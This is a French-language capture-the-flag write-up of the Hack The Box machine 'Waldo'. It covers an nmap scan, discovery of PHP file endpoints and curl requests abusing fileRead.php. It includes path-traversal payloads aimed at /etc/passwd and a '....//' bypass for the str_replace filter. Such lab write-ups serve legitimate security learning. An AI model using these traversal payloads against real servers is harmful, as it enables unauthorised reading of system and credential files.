# Waldo writeups by Seyptoo.

![forthebadge made-with-python](http://image.noelshack.com/fichiers/2019/02/2/1546971003-capture-du-2019-01-08-19-09-54.png)

Informations
----
    Ip :  10.10.10.87       Created by :  strawman & capnspacehook 
    Level : Easy            Base Points : 30
    
Nmap Scan
----
    Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-08 19:08 CET
    Nmap scan report for 10.10.10.87
    Host is up (0.065s latency).
    Not shown: 997 closed ports
    PORT     STATE    SERVICE        VERSION
    22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
    |_  256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
    80/tcp   open     http           nginx 1.12.2
    |_http-server-header: nginx/1.12.2
    | http-title: List Manager
    |_Requested resource was /list.html
    8888/tcp filtered sun-answerbook

Le port 22 pour le **SSH**, le 80 pour le serveur **HTTP**. Allons voir ça de beaucoup plus près. Nous avons également des informations sur le serveur HTTP il y'a un fichier qui se nomme /list.html donc nous allons énumérer ça.

HTTP
----
Sur la page HTTP on peut pas faire grand chose on peut seulement ajouter des listes.. mais cela n'est pas suffisant pour l'énumération.
Si nous regardons la source de la page il y'a des informations. Il y'a un fichier javascript donc je suis aller voir de plus près.

    <html>
      <head>
        <title>List Manager</title>
        <script src="/list.js"></script>
        [...SNIP...]
        
Il y'a des fonctions sur le fichier javascript. Donc nous avons trouver plusieurs fichiers PHP.

fileWrite.php (Fichier pour créer des listes) Paramètre : listnum=&data=<br />
fileDelete.php (Fichier pour supprimer des listes) Paramètre : listnum=<br />
fileRead.php (Fichier pour lire des fichiers sensibles) Paramètre : file=<br />
dirRead.php (Fichier pour lire les répértoires) Paramètre : path=<br />

On va plus s'intéréssé au fichier fileRead.php et dirRead.php ils sont beaucoup plus utiles.

    root@:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=fileRead.php"|jq -r .file
    <?php


    if($_SERVER['REQUEST_METHOD'] === "POST"){
            $fileContent['file'] = false;
            header('Content-Type: application/json');
            if(isset($_POST['file'])){
                    header('Content-Type: application/json');
                    $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                    if(strpos($_POST['file'], "user.txt") === false){
                            $file = fopen("/var/www/html/" . $_POST['file'], "r");
                            $fileContent['file'] = fread($file,filesize($_POST['file']));  
                            fclose();
                    }
            }
            echo json_encode($fileContent);
    }
    
Voilà on a réussis à lire le fichier fileRead.php comme pour on peut le voir il y'a du str_replace.

    root@:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
    {
      "file": false
    }
    
Donc si nous essayons de lire le fichier passwd sur le dossier /etc.

    root@:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
    {
      "file": false
    }
    
Donc impossible de lire ça, nous devons bypass ça. Il y'a du str_array() donc pour bypass ça vous devez simplement faire ....//....//....//....//....//....//directory/file


